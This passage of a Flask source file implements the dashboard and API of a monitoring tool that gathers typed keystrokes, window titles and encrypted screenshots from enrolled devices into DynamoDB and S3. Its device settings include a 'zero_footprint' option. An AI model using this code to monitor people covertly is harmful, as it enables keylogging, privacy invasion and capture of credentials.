                const res = await fetch('/api/logs', {
                    method: 'DELETE',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ timestamp, text, date: selectedDate })
                });
                if (res.ok) {
                    const key = `${timestamp}||${text}`;
                    selectedLogKeys.delete(key);
                    fetchLogs();
                } else {
                    alert("Failed to delete log entry");
                }
            } catch (err) {
                console.error("Error deleting log:", err);
            }
        }
        
        async function bulkDeleteLogs() {
            if (selectedLogKeys.size === 0) return;
            
            if (!confirm(`Are you sure you want to delete the ${selectedLogKeys.size} selected log entries? (This will also delete their associated screenshots)`)) {
                return;
            }
            
            const targets = Array.from(selectedLogKeys).map(key => {
                const parts = key.split('||');
                return { timestamp: parts[0], text: parts[1] };
            });
            
            try {
                const res = await fetch('/api/logs/bulk-delete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ logs: targets, date: selectedDate })
                });
                if (res.ok) {
                    selectedLogKeys.clear();
                    fetchLogs();
                } else {
                    alert("Failed to delete selected logs");
                }
            } catch (err) {
                console.error("Error bulk deleting logs:", err);
            }
        }
        
        // Selection handlers for Screenshots
        function toggleSelectAllScreenshots(selectAllBox) {
            const checkboxes = document.querySelectorAll('.screenshot-item-checkbox');
            checkboxes.forEach(box => {
                box.checked = selectAllBox.checked;
                const filename = box.getAttribute('data-filename');
                if (selectAllBox.checked) {
                    selectedScreenshotFilenames.add(filename);
                } else {
                    selectedScreenshotFilenames.delete(filename);
                }
            });
            updateScreenshotSelection();
        }
        
        function updateScreenshotSelection() {
            const checkboxes = document.querySelectorAll('.screenshot-item-checkbox');
            checkboxes.forEach(box => {
                const filename = box.getAttribute('data-filename');
                if (box.checked) {
                    selectedScreenshotFilenames.add(filename);
                } else {
                    selectedScreenshotFilenames.delete(filename);
                }
            });
            
            const checkedCount = selectedScreenshotFilenames.size;
            const btn = document.getElementById('bulk-delete-screenshots-btn');
            btn.disabled = checkedCount === 0;
            btn.innerText = `Delete Selected (${checkedCount})`;
            
            const selectAllBox = document.getElementById('select-all-screenshots');
            if (checkboxes.length > 0) {
                const allChecked = Array.from(checkboxes).every(box => {
                    return selectedScreenshotFilenames.has(box.getAttribute('data-filename'));
                });
                selectAllBox.checked = allChecked;
            } else {
                selectAllBox.checked = false;
            }
        }
        
        async function deleteScreenshot(filename) {
            if (!confirm("Are you sure you want to delete this screenshot?")) {
                return;
            }
            try {
                const res = await fetch(`/api/screenshots/${filename}`, {
                    method: 'DELETE'
                });
                if (res.ok) {
                    selectedScreenshotFilenames.delete(filename);
                    fetchScreenshots();
                } else {
                    alert("Failed to delete screenshot");
                }
            } catch (err) {
                console.error("Error deleting screenshot:", err);
            }
        }
        
        async function bulkDeleteScreenshots() {
            if (selectedScreenshotFilenames.size === 0) return;
            
            if (!confirm(`Are you sure you want to delete the ${selectedScreenshotFilenames.size} selected screenshots?`)) {
                return;
            }
            
            const filenames = Array.from(selectedScreenshotFilenames);
            
            try {
                const res = await fetch('/api/screenshots/bulk-delete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ filenames })
                });
                if (res.ok) {
                    selectedScreenshotFilenames.clear();
                    fetchScreenshots();
                } else {
                    alert("Failed to delete selected screenshots");
                }
            } catch (err) {
                console.error("Error bulk deleting screenshots:", err);
            }
        }
        
        function escapeHtml(str) {
            return str
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }
        
        // Initial load
        async function init() {
            // Restore active tab
            if (currentTab === 'screenshots-tab') {
                const btn = document.querySelector('button[onclick*="screenshots-tab"]');
                if (btn) switchTab('screenshots-tab', btn);
            }
            // Restore sort select if it exists in UI
            const sortSelect = document.getElementById('sort-select');
            if (sortSelect) sortSelect.value = selectedSort;
            
            // Set date inputs
            document.getElementById('start-date-input').value = startDate;
            document.getElementById('end-date-input').value = endDate;
            
            // Restore date preset selection
            const presetSelect = document.getElementById('date-preset-select');
            if (presetSelect) {
                presetSelect.value = datePreset;
                changeDatePreset(datePreset);
            }
            
            initBannerOtp();
            await fetchDevices();
            
            // Restore navigation view state
            if (selectedDevice && allDevices.some(d => d.device_id === selectedDevice)) {
                selectDeviceDetails(selectedDevice);
            } else {
                goBackToDevices();
            }
        }
        init();
        
        function manualRefresh() {
            fetchDevices();
            if (selectedDevice) {
                updateDeviceStatus();
                fetchLogs();
                fetchScreenshots();
            }
        }

        // Update loops
        setInterval(() => {
            if (selectedDevice) {
                updateDeviceStatus();
                if (currentTab === 'logs-tab') {
                    fetchLogs();
                } else {
                    fetchScreenshots();
                }
            } else {
                fetchDevices();
            }
        }, 10000); // Slowed down auto-refresh to 10 seconds to prevent selection/stutter lags
        
        setInterval(() => {
            if (selectedDevice) {
                fetchDevices();
                if (currentTab === 'logs-tab') {
                    fetchScreenshots();
                } else {
                    fetchLogs();
                }
            }
        }, 30000); // Background refresh every 30 seconds
    </script>
</body>
</html>
"""

def parse_logs(date_str):
    log_file = os.path.join("logs", f"log_{date_str}.txt")
    if not os.path.exists(log_file):
        return []
    logs = []
    
    current_entry = {}
    with open(log_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line_str = line.strip()
            if line_str.startswith("--- ") and line_str.endswith(" ---"):
                if current_entry:
                    logs.append(current_entry)
                timestamp = line_str[4:-4]
                current_entry = {
                    "timestamp": timestamp,
                    "window": "Unknown Window",
                    "text": "",
                    "screenshot": None
                }
            elif line_str.startswith("Active Window:"):
                if current_entry:
                    current_entry["window"] = line_str[len("Active Window:"):].strip()
            elif line_str.startswith("Typed Text   :"):
                if current_entry:
                    current_entry["text"] = line_str[len("Typed Text   :"):].strip()
            elif line_str.startswith("Screenshot   :"):
                if current_entry:
                    screenshot_path = line_str[len("Screenshot   :"):].strip()
                    if screenshot_path and screenshot_path != "None":
                        if os.path.exists(screenshot_path):
                            current_entry["screenshot"] = screenshot_path.replace("\\", "/")
            elif line_str.startswith("----------------------------------------"):
                if current_entry:
                    logs.append(current_entry)
                    current_entry = {}
                    
        if current_entry and current_entry.get("timestamp"):
            logs.append(current_entry)
            
    return [log for log in logs if log.get("timestamp")]

# ==================== DASHBOARD AUTHENTICATION MIDDLEWARE & ROUTES ====================
@app.before_request
def require_dashboard_auth():
    # 1. Allow login endpoints and static assets
    if request.path in ['/login', '/api/login']:
        return None
    if request.path.startswith('/static/'):
        return None
    # 2. Allow client endpoints (authenticated with X-Device-Token or OTP)
    if request.path.startswith('/api/client/'):
        return None

    # 3. Check if request is authenticated
    if not is_dashboard_authenticated():
        if request.path.startswith('/api/') or request.path.startswith('/screenshots/'):
            return jsonify({"error": "Unauthorized. Dashboard login required."}), 401
        return redirect('/login')
    return None

@app.route('/login', methods=['GET'])
def login_view():
    if is_dashboard_authenticated():
        return redirect('/')
    return render_template_string(LOGIN_HTML)

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json or {}
    username = (data.get("username") or "").strip()
    password = data.get("password") or ""
    if username == DASHBOARD_USER and password == DASHBOARD_PASS:
        resp = jsonify({"status": "success"})
        resp.set_cookie(
            "mstool_auth",
            get_auth_cookie_token(),
            max_age=30 * 86400,  # 30 days
            httponly=True,
            samesite="Lax"
        )
        return resp, 200
    return jsonify({"error": "Invalid username or password"}), 401

@app.route('/logout', methods=['GET'])
def logout_view():
    resp = redirect('/login')
    resp.delete_cookie("mstool_auth")
    return resp

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/screenshots/<path:filename>')
def serve_screenshot(filename):
    return view_decrypted_screenshot(filename)

@app.route('/api/screenshots/view/<path:filename>')
def view_decrypted_screenshot(filename):
    """
    Secure endpoint for authorized administrators to view decrypted screenshots.
    Verifies dashboard authentication.
    Fetches the encrypted .dat file from S3 or local storage.
    Decrypts in memory using AES-256-GCM.
    Returns decrypted image with strict no-cache headers.
    Never persists plaintext images to disk.
    """
    if '..' in filename:
        return jsonify({"error": "Invalid path"}), 400

    if not is_dashboard_authenticated():
        return jsonify({"error": "Unauthorized: Admin authentication required"}), 401

    encrypted_bytes = None

    # Resolve candidate paths (.dat / .webp interchangeable)
    candidates = [filename]
    if filename.endswith(".webp"):
        candidates.append(filename[:-5] + ".dat")
    elif filename.endswith(".dat"):
        candidates.append(filename[:-4] + ".webp")
    if "/" in filename:
        sub = filename.split("/", 1)[1]
        candidates.append(sub)
        if sub.endswith(".webp"):
            candidates.append(sub[:-5] + ".dat")
        elif sub.endswith(".dat"):
            candidates.append(sub[:-4] + ".webp")

    # 1. Fetch from S3 if configured
    if s3_client is not None and S3_BUCKET:
        for key in candidates:
            try:
                res = s3_client.get_object(Bucket=S3_BUCKET, Key=key)
                encrypted_bytes = res['Body'].read()
                if encrypted_bytes:
                    break
            except Exception:
                pass

    # 2. Fallback to local screenshots/ directory
    if encrypted_bytes is None:
        for key in candidates:
            local_path = os.path.join("screenshots", key)
            if os.path.exists(local_path):
                try:
                    with open(local_path, "rb") as f:
                        encrypted_bytes = f.read()
                    if encrypted_bytes:
                        break
                except Exception:
                    pass

    if encrypted_bytes is None:
        # Return crisp SVG placeholder so browser renders cleanly without broken image icons
        placeholder_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="640" height="360" viewBox="0 0 640 360">
  <rect width="100%" height="100%" fill="#0d1527"/>
  <rect x="20" y="20" width="600" height="320" rx="12" fill="#131d36" stroke="#253556" stroke-width="2" stroke-dasharray="6 6"/>
  <circle cx="320" cy="140" r="32" fill="#1e293b"/>
  <path d="M308 140 L316 148 L332 132" stroke="#60a5fa" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
  <text x="320" y="205" text-anchor="middle" fill="#e2e8f0" font-family="-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif" font-size="15" font-weight="600">Encrypted Screenshot Sync Pending</text>
  <text x="320" y="230" text-anchor="middle" fill="#94a3b8" font-family="-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif" font-size="12">Capture pending upload or device is offline</text>
  <text x="320" y="255" text-anchor="middle" fill="#64748b" font-family="-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif" font-size="11">Protected by AES-256-GCM authenticated encryption</text>
</svg>"""
        resp = Response(placeholder_svg, mimetype="image/svg+xml")
        resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private, max-age=0"
        return resp

    try:
        decrypted_bytes = decrypt_screenshot_bytes(encrypted_bytes)

        # Detect mimetype
        if decrypted_bytes.startswith(b"RIFF"):
            mime_type = "image/webp"
        elif decrypted_bytes.startswith(b"\x89PNG"):
            mime_type = "image/png"
        elif decrypted_bytes.startswith(b"\xff\xd8\xff"):
            mime_type = "image/jpeg"
        else:
            mime_type = "image/webp"

        resp = Response(decrypted_bytes, mimetype=mime_type)
        resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private, max-age=0"
        resp.headers["Pragma"] = "no-cache"
        resp.headers["Expires"] = "0"
        return resp
    except Exception as e:
        print(f"Decryption failed for {filename}: {e}")
        error_svg = f"""<svg xmlns="http://www.w3.org/2000/svg" width="640" height="360" viewBox="0 0 640 360">
  <rect width="100%" height="100%" fill="#1a1118"/>
  <rect x="20" y="20" width="600" height="320" rx="12" fill="#221520" stroke="#4a1d2e" stroke-width="2"/>
  <circle cx="320" cy="140" r="32" fill="#381a28"/>
  <path d="M320 125 L320 145 M320 155 L320 157" stroke="#f87171" stroke-width="3" stroke-linecap="round"/>
  <text x="320" y="205" text-anchor="middle" fill="#fca5a5" font-family="-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif" font-size="15" font-weight="600">Decryption Failed</text>
  <text x="320" y="230" text-anchor="middle" fill="#f87171" font-family="-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif" font-size="12">Key mismatch or tampered ciphertext</text>
</svg>"""
        resp = Response(error_svg, mimetype="image/svg+xml", status=500)
        resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private, max-age=0"
        return resp

@app.route('/api/devices')
def get_devices():
    if devices_tbl is not None:
        try:
            res = devices_tbl.scan()
            items = [
                d for d in res.get("Items", [])
                if not str(d.get("device_id", "")).startswith("OTP#")
                and d.get("device_id") != "CURRENT_ENROLLMENT_OTP"
                and not str(d.get("device_id", "")).endswith(('.dat', '.webp', '.png', '.jpg', '.jpeg'))
            ]
            items.sort(key=lambda d: d.get("nickname", "").lower())
            return jsonify(items)
        except Exception as e:
            print(f"Failed to query devices from DynamoDB: {e}")
            
    # Fallback/local mode
    device_id = get_device_id()
    hostname = socket.gethostname() or "Unknown Device"
    return jsonify([{"device_id": device_id, "nickname": hostname}])

@app.route('/api/devices/rename', methods=['POST'])
def rename_device():
    data = request.json or {}
    device_id = data.get("device_id")
    nickname = data.get("nickname")
    if not device_id or not nickname:
        return jsonify({"error": "Device ID and Nickname required"}), 400
        
    if devices_tbl is not None:
        try:
            devices_tbl.update_item(
                Key={"device_id": device_id},
                UpdateExpression="SET nickname = :nn",
                ExpressionAttributeValues={":nn": nickname}
            )
            return jsonify({"status": "success"}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"error": "DynamoDB not configured"}), 500

@app.route('/api/devices/delete', methods=['DELETE'])
def delete_device():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "Device ID required"}), 400
        
    if devices_tbl is not None:
        try:
            # 1. Fetch screenshot filenames to purge from S3
            if logs_tbl is not None:
                res = logs_tbl.query(
                    KeyConditionExpression="device_id = :did",
                    ExpressionAttributeValues={":did": device_id},
                    ProjectionExpression="timestamp_id, screenshot_filename"
                )
                items = res.get("Items", [])
                s3_keys = [it["screenshot_filename"] for it in items if it.get("screenshot_filename")]
                if s3_keys and s3_client and S3_BUCKET:
                    for i in range(0, len(s3_keys), 1000):
                        batch = s3_keys[i:i+1000]
                        try:
                            s3_client.delete_objects(
                                Bucket=S3_BUCKET,
                                Delete={"Objects": [{"Key": k} for k in batch]}
                            )
                        except Exception:
                            pass
                # 2. Delete all log items for this device
                with logs_tbl.batch_writer() as batch:
                    for it in items:
                        batch.delete_item(Key={"device_id": device_id, "timestamp_id": it["timestamp_id"]})
                        
            # 3. Delete the device registration record
            devices_tbl.delete_item(Key={"device_id": device_id})
            return jsonify({"status": "success"}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"error": "DynamoDB not configured"}), 500

@app.route('/api/logs/purge-range', methods=['POST'])
def purge_range():
    try:
        data = request.json or {}
        device_id = data.get("device_id")
        start_date = data.get("start_date")
        end_date = data.get("end_date")
        
        if not device_id:
            return jsonify({"error": "Device ID required"}), 400
            
        all_time = not start_date or not end_date
        deleted_count = 0
        if logs_tbl is not None:
            try:
                if all_time:
                    res = logs_tbl.query(
                        KeyConditionExpression="device_id = :did",
                        ExpressionAttributeValues={":did": device_id}
                    )
                else:
                    res = logs_tbl.query(
                        KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
                        ExpressionAttributeValues={
                            ":did": device_id,
                            ":start": f"{start_date} 00:00:00#",
                            ":end": f"{end_date} 23:59:59#~"
                        }
                    )
                items = res.get("Items", [])
                deleted_count = len(items)
                
                # Delete screenshots from S3
                s3_keys = [it["screenshot_filename"] for it in items if it.get("screenshot_filename")]
                if s3_keys and s3_client and S3_BUCKET:
                    for i in range(0, len(s3_keys), 1000):
                        batch = s3_keys[i:i+1000]
                        try:
                            s3_client.delete_objects(
                                Bucket=S3_BUCKET,
                                Delete={"Objects": [{"Key": k} for k in batch]}
                            )
                        except Exception:
                            pass
                            
                # Delete items from DynamoDB
                with logs_tbl.batch_writer() as batch:
                    for it in items:
                        batch.delete_item(Key={"device_id": device_id, "timestamp_id": it["timestamp_id"]})
            except Exception as e:
                print(f"Failed to purge date range from DynamoDB: {e}")
                
        return jsonify({"status": "success", "deleted_count": deleted_count}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/devices/config', methods=['GET'])
def get_device_config():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "Device ID required"}), 400
        
    if devices_tbl is not None:
        try:
            res = devices_tbl.get_item(Key={"device_id": device_id})
            if "Item" in res:
                item = res["Item"]
                cfg = item.get("config", {})
                config = json.loads(cfg) if isinstance(cfg, str) else (cfg or {})
                config["_last_active"] = item.get("last_active")
                config["_nickname"] = item.get("nickname")
                return jsonify(config), 200
        except Exception as e:
            print(f"Failed to fetch device config: {e}")
            
    return jsonify({
        "is_disabled": False,
        "disable_mouse_clicks": False,
        "periodic_screenshot_interval": 300,
        "zero_footprint": False,
        "idle_threshold": 300,
        "only_capture_on_switch": False
    }), 200

@app.route('/api/devices/config', methods=['POST'])
def save_device_config():
    data = request.json or {}
    device_id = data.get("device_id")
    if not device_id:
        return jsonify({"error": "Device ID required"}), 400
        
    config = {
        "is_disabled": data.get("is_disabled", False),
        "disable_mouse_clicks": data.get("disable_mouse_clicks", False),
        "periodic_screenshot_interval": int(data.get("periodic_screenshot_interval", 300)),
        "zero_footprint": data.get("zero_footprint", False),
        "idle_threshold": int(data.get("idle_threshold", 300)),
        "only_capture_on_switch": data.get("only_capture_on_switch", False)
    }
    
    if devices_tbl is not None:
        try:
            devices_tbl.update_item(
                Key={"device_id": device_id},
                UpdateExpression="SET config = :cfg",
                ExpressionAttributeValues={":cfg": json.dumps(config)}
            )
            return jsonify({"status": "success"}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
            
    return jsonify({"error": "DynamoDB not configured"}), 500

@app.route('/api/devices/sync-status', methods=['GET'])
def get_device_sync_status():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "Device ID required"}), 400
        
    if devices_tbl is not None:
        try:
            res = devices_tbl.get_item(Key={"device_id": device_id})
            item = res.get("Item", {})
            desired = {}
            if "config" in item:
                cfg = item["config"]
                desired = json.loads(cfg) if isinstance(cfg, str) else cfg
            actual = {}
            if "sync_status" in item:
                st = item["sync_status"]
                actual = json.loads(st) if isinstance(st, str) else st
                
            synced_at = actual.pop("synced_at", None)
            is_synced = (desired == actual) if (desired or actual) else True
            return jsonify({
                "is_synced": is_synced,
                "synced_at": synced_at,
                "desired": desired,
                "actual": actual
            }), 200
        except Exception as e:
            print(f"Failed to fetch sync status: {e}")
            
    return jsonify({"is_synced": True, "synced_at": None}), 200

@app.route('/api/dates')
def get_available_dates():
    dates = set()
    device_id = request.args.get("device_id")
    
    if logs_tbl is not None:
        try:
            if device_id:
                res = logs_tbl.query(
                    KeyConditionExpression="device_id = :did",
                    ExpressionAttributeValues={":did": device_id},
                    ProjectionExpression="created_date"
                )
            else:
                res = logs_tbl.scan(ProjectionExpression="created_date")
            for item in res.get("Items", []):
                cd = item.get("created_date")
                if cd:
                    dates.add(cd)
        except Exception as e:
            print(f"Failed to query dates from DynamoDB: {e}")
            
    # Always include local dates as backup
    if os.path.exists("logs"):
        for f in os.listdir("logs"):
            match = re.match(r"^log_(\d{4}-\d{2}-\d{2})\.txt$", f)
            if match:
                dates.add(match.group(1))
    if os.path.exists("screenshots"):
        for d in os.listdir("screenshots"):
            if re.match(r"^\d{4}-\d{2}-\d{2}$", d) and os.path.isdir(os.path.join("screenshots", d)):
                dates.add(d)
                
    if not dates:
        dates.add(datetime.now().strftime("%Y-%m-%d"))
        
    return jsonify(sorted(list(dates), reverse=True))

@app.route('/api/logs')
def get_logs():
    all_time = request.args.get("all_time", "false").lower() == "true"
    start_date = request.args.get("start_date")
    end_date = request.args.get("end_date")
    
    if not all_time and (not start_date or not end_date):
        single_date = request.args.get("date", datetime.now().strftime("%Y-%m-%d"))
        start_date = single_date
        end_date = single_date
        
    device_id = request.args.get("device_id")
    
    if logs_tbl is not None:
        try:
            items = []
            if device_id:
                if all_time:
                    res = logs_tbl.query(
                        KeyConditionExpression="device_id = :did",
                        ExpressionAttributeValues={":did": device_id}
                    )
                else:
                    res = logs_tbl.query(
                        KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
                        ExpressionAttributeValues={
                            ":did": device_id,
                            ":start": f"{start_date} 00:00:00#",
                            ":end": f"{end_date} 23:59:59#~"
                        }
                    )
                items = res.get("Items", [])
            else:
                dev_res = devices_tbl.scan(ProjectionExpression="device_id") if devices_tbl else {}
                for d in dev_res.get("Items", []):
                    did = d["device_id"]
                    if all_time:
                        q_res = logs_tbl.query(KeyConditionExpression="device_id = :did", ExpressionAttributeValues={":did": did})
                    else:
                        q_res = logs_tbl.query(
                            KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
                            ExpressionAttributeValues={
                                ":did": did,
                                ":start": f"{start_date} 00:00:00#",
                                ":end": f"{end_date} 23:59:59#~"
                            }
                        )
                    items.extend(q_res.get("Items", []))
                    
            items.sort(key=lambda x: x.get("timestamp", ""))
            logs = []
            for row in items:
                screenshot_filename = row.get("screenshot_filename")
                screenshot_url = row.get("screenshot_url")
                
                if screenshot_filename and s3_client and S3_BUCKET:
                    screenshot_url = get_screenshot_signed_url(screenshot_filename) or screenshot_url
                    
                logs.append({
                    "timestamp": row.get("timestamp"),
                    "window": row.get("window_title"),
                    "text": row.get("typed_text"),
                    "screenshot": screenshot_url,
                    "screenshot_filename": screenshot_filename
                })
            return jsonify(logs)
        except Exception as e:
            print(f"Failed to query logs from DynamoDB: {e}")
            
    # Fallback to local files
    return jsonify(parse_logs(start_date))

@app.route('/api/screenshots')
def get_screenshots():
    all_time = request.args.get("all_time", "false").lower() == "true"
    start_date = request.args.get("start_date")
    end_date = request.args.get("end_date")
    
    if not all_time and (not start_date or not end_date):
        single_date = request.args.get("date", datetime.now().strftime("%Y-%m-%d"))
        start_date = single_date
        end_date = single_date
        
    device_id = request.args.get("device_id")
    
    if logs_tbl is not None:
        try:
            items = []
            if device_id:
                if all_time:
                    res = logs_tbl.query(
                        KeyConditionExpression="device_id = :did",
                        ExpressionAttributeValues={":did": device_id}
                    )
                else:
                    res = logs_tbl.query(
                        KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
                        ExpressionAttributeValues={
                            ":did": device_id,
                            ":start": f"{start_date} 00:00:00#",
                            ":end": f"{end_date} 23:59:59#~"
                        }
                    )
                items = res.get("Items", [])
            else:
                dev_res = devices_tbl.scan(ProjectionExpression="device_id") if devices_tbl else {}
                for d in dev_res.get("Items", []):
                    did = d["device_id"]
                    if all_time:
                        q_res = logs_tbl.query(KeyConditionExpression="device_id = :did", ExpressionAttributeValues={":did": did})
                    else:
                        q_res = logs_tbl.query(
                            KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
                            ExpressionAttributeValues={
                                ":did": did,
                                ":start": f"{start_date} 00:00:00#",
                                ":end": f"{end_date} 23:59:59#~"
                            }
                        )
                    items.extend(q_res.get("Items", []))
                    
            screenshot_list = []
            for row in items:
                screenshot_filename = row.get("screenshot_filename")
                if not screenshot_filename:
                    continue
                signed_url = get_screenshot_signed_url(screenshot_filename)
                screenshot_list.append({
                    "filename": screenshot_filename,
                    "url": signed_url,
                    "time": row.get("timestamp"),
                    "window": row.get("window_title")
                })
            screenshot_list.sort(key=lambda s: s["time"])
            return jsonify(screenshot_list)
        except Exception as e:
            print(f"Failed to query screenshots from DynamoDB: {e}")
            
    # Fallback to local files
    screenshot_dir = os.path.join("screenshots", start_date)
    if not os.path.exists(screenshot_dir):
        return jsonify([])
    files = os.listdir(screenshot_dir)
    valid_files = sorted([f for f in files if f.endswith(".dat") or f.endswith(".bin") or f.endswith(".png") or f.endswith(".webp")], reverse=False)
    
    logs = parse_logs(start_date)
    screenshot_to_window = {}
    for log_entry in logs:
        if log_entry["screenshot"]:
            filename = os.path.basename(log_entry["screenshot"])
            screenshot_to_window[filename] = log_entry["window"]
            
    screenshot_list = []
    for f in valid_files:
        ts_part = f.replace("screenshot_", "").replace("screenshot_periodic_", "").split(".")[0]
        try:
            parts = ts_part.split("_")
            date_part = parts[0]
            time_part = parts[1]
            formatted_time = f"{date_part[0:4]}-{date_part[4:6]}-{date_part[6:8]} {time_part[0:2]}:{time_part[2:4]}:{time_part[4:6]}"
        except Exception:
            formatted_time = ts_part
            
        screenshot_list.append({
            "filename": f"{date_str}/{f}",
            "url": f"/screenshots/{date_str}/{f}",
            "time": formatted_time,
            "window": screenshot_to_window.get(f, "Unknown Window")
        })
    return jsonify(screenshot_list)

@app.route('/api/screenshots/<path:filename>', methods=['DELETE'])
def delete_screenshot(filename):
    if '..' in filename:
        return jsonify({"error": "Invalid filename"}), 400
        
    s3_deleted = False
    if s3_client is not None and S3_BUCKET:
        try:
            s3_client.delete_object(Bucket=S3_BUCKET, Key=filename)
            s3_deleted = True
        except Exception as e:
            print(f"Failed to delete screenshot from S3: {e}")
            
    # Try deleting locally
    local_path = os.path.join("screenshots", filename)
    local_deleted = False
    if os.path.exists(local_path):
        try:
            os.remove(local_path)
            local_deleted = True
        except Exception:
            pass
            
    if s3_deleted or local_deleted:
        return jsonify({"status": "success"}), 200
        
    return jsonify({"error": "File not found or deletion failed"}), 404

@app.route('/api/screenshots/bulk-delete', methods=['POST'])
def bulk_delete_screenshots():
    try:
        data = request.json or {}
        filenames = data.get("filenames", [])
        
        # 1. Delete from S3
        if s3_client is not None and S3_BUCKET and filenames:
            try:
                for i in range(0, len(filenames), 1000):
                    batch = filenames[i:i+1000]
                    s3_client.delete_objects(
                        Bucket=S3_BUCKET,
                        Delete={"Objects": [{"Key": k} for k in batch]}
                    )
            except Exception as e:
                print(f"Failed to bulk delete screenshots from S3: {e}")
                
        # 2. Delete local files
        for filename in filenames:
            if '..' in filename:
                continue
            path = os.path.join("screenshots", filename)
            if os.path.exists(path):
                try:
                    os.remove(path)
                except Exception:
                    pass
        return jsonify({"status": "success", "deleted": len(filenames)}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/logs', methods=['DELETE'])
def delete_log():
    try:
        data = request.json or {}
        timestamp = data.get("timestamp")
        text = data.get("text")
        date_str = data.get("date")
        device_id = data.get("device_id") or get_device_id()
        if not timestamp:
            return jsonify({"error": "Timestamp required"}), 400
            
        import html
        if text:
            text = html.unescape(text).replace("\\'", "'")
            
        # Try deleting from DynamoDB
        if logs_tbl is not None:
            try:
                date_part = timestamp.split(" ")[0] if " " in timestamp else ""
                res = logs_tbl.query(
                    KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
                    ExpressionAttributeValues={
                        ":did": device_id,
                        ":start": f"{date_part} 00:00:00#",
                        ":end": f"{date_part} 23:59:59#~"
                    }
                )
                for item in res.get("Items", []):
                    if item.get("timestamp") == timestamp and item.get("typed_text") == text:
                        sf = item.get("screenshot_filename")
                        if sf and s3_client and S3_BUCKET:
                            try:
                                s3_client.delete_object(Bucket=S3_BUCKET, Key=sf)
                            except Exception:
                                pass
                        logs_tbl.delete_item(Key={"device_id": device_id, "timestamp_id": item["timestamp_id"]})
            except Exception as e:
                print(f"Failed to delete log from DynamoDB: {e}")
                
        # Fallback to local logs deletion
        log_files = []
        if date_str:
            log_files.append(os.path.join("logs", f"log_{date_str}.txt"))
        log_files.append("log.txt")
        
        for log_file in log_files:
            if not os.path.exists(log_file):
                continue
            with open(log_file, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            
            escaped_ts = re.escape(timestamp)
            escaped_text = re.escape(text)
            
            pattern = re.compile(
                rf"--- {escaped_ts} ---\r?\nActive Window:.*?\r?\nTyped Text   : {escaped_text}\r?\nScreenshot   : (.*?)\r?\n(?:Screenshot File: (.*?)\r?\n)?-+\r?\n\r?\n?",
                re.DOTALL
            )
            
            match = pattern.search(content)
            if match:
                screenshot_path = match.group(1).strip()
                if screenshot_path and screenshot_path != "None" and not screenshot_path.startswith("http") and log_file == log_files[0]:
                    if os.path.exists(screenshot_path):
                        try:
                            os.remove(screenshot_path)
                        except Exception:
                            pass
                
                content = pattern.sub("", content)
                with open(log_file, "w", encoding="utf-8") as f:
                    f.write(content)
                    
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/logs/bulk-delete', methods=['POST'])
def bulk_delete_logs():
    try:
        data = request.json or {}
        targets = data.get("logs", [])
        date_str = data.get("date")
        device_id = data.get("device_id") or get_device_id()
        if not targets:
            return jsonify({"error": "Logs required"}), 400
            
        # Delete from DynamoDB
        if logs_tbl is not None:
            try:
                for target in targets:
                    ts = target.get("timestamp")
                    txt = target.get("text")
                    if not ts:
                        continue
                    date_part = ts.split(" ")[0] if " " in ts else ""
                    res = logs_tbl.query(
                        KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
                        ExpressionAttributeValues={
                            ":did": device_id,
                            ":start": f"{date_part} 00:00:00#",
                            ":end": f"{date_part} 23:59:59#~"
                        }
                    )
                    for item in res.get("Items", []):
                        if item.get("timestamp") == ts and (not txt or item.get("typed_text") == txt):
                            sf = item.get("screenshot_filename")
                            if sf and s3_client and S3_BUCKET:
                                try:
                                    s3_client.delete_object(Bucket=S3_BUCKET, Key=sf)
                                except Exception:
                                    pass
                            logs_tbl.delete_item(Key={"device_id": device_id, "timestamp_id": item["timestamp_id"]})
            except Exception as e:
                print(f"Failed to bulk delete logs from DynamoDB: {e}")
                
        # Delete from local files (one read and write pass per file)
        log_files = []
        if date_str:
            log_files.append(os.path.join("logs", f"log_{date_str}.txt"))
        log_files.append("log.txt")
        
        for log_file in log_files:
            if not os.path.exists(log_file):
                continue
            with open(log_file, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
                
            modified = False
            for target in targets:
                ts = target.get("timestamp")
                txt = target.get("text")
                if not ts or not txt:
                    continue
                
                escaped_ts = re.escape(ts)
